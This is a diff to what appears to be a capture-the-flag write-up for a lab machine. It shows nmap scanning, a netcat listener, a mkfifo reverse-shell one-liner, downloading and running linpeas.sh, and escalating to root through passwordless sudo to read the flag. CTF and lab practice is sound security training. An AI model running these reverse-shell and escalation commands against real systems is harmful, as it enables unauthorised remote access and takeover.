@@ -3,7 +3,7 @@
 
 ```bash
 export IP=
-export PORT=8000 
+export PORT=
 export HOSTIP=
 ```
 
@@ -13,13 +13,19 @@ nmap -p- -sC -sV -oN nmap/initial $IP
 ```
 
 
-2. Send through the web terminal:
+2. Get a reverse Shell:
+
+Start a listener:
+```bash
+nc -lnvp $PORT
+```
+
 
 [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 9999 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
 3. Stabilize shell:
@@ -56,3 +62,19 @@ wget "$HOSTIP/linpeas.sh"
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+
+Linpeas will tell us that this user can run `sudo` without a password!
+Thats our ticket in!
+
+```bash
+sudo su
+```
+
+And we're root!
+
+### Root Flag:
+
+```bash
+cat /root/flag.txt
+```
+
